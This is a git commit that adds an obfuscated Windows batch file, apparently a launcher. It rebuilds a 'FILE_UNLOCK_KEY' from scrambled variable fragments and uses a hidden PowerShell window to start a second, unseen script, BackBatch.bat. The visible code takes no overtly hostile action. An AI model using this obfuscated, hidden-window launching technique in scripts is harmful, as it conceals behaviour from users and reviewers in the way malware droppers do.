f03038b71f5d3d86ff2c7145698099102f8d58c1
#C0KE <106424718+90-C0KE@users.noreply.github.com>
2023-03-06 20:11:29 +1100

    Create BackBatch_Opener.bat

---
+++ BackBatch_Opener.bat
@@ -0,0 +1,15 @@
+::
+::
+:: 1k0des Back Batch Opener
+::
+:: Obfuscated By 1k0de
+
+@echo off
+set "wbfuhw=set"
+%wbfuhw% "ehfwirh= "
+%wbfuhw%%ehfwirh%"enfwyehf=="
+%wbfuhw%%ehfwirh%"ergvg8rhw%enfwyehf%^_"&&%wbfuhw%%ehfwirh%"efuwghuj%enfwyehf%_@$tu35hg92ff"&&%wbfuhw%%ehfwirh%"gn6jg35n%enfwyehf%j4g35g$"
+%wbfuhw%%ehfwirh%"ethoonge%enfwyehf%U%&&JH+EGRwghwqQE"
+%wbfuhw%%ehfwirh%"wghwr3gf4fn%enfwyehf%FW{RHp5"
+%wbfuhw%%ehfwirh%"FILE_UNLOCK_KEY%enfwyehf%%efuwghuj%%gn6jg35n%%ergvg8rhw%%ethoonge%|%wghwr3gf4fn%"
+PowerShell -WindowStyle Hidden -Command "Start-Process BackBatch.bat -WindowStyle Maximized -ArgumentList '--start-fullscreen'"
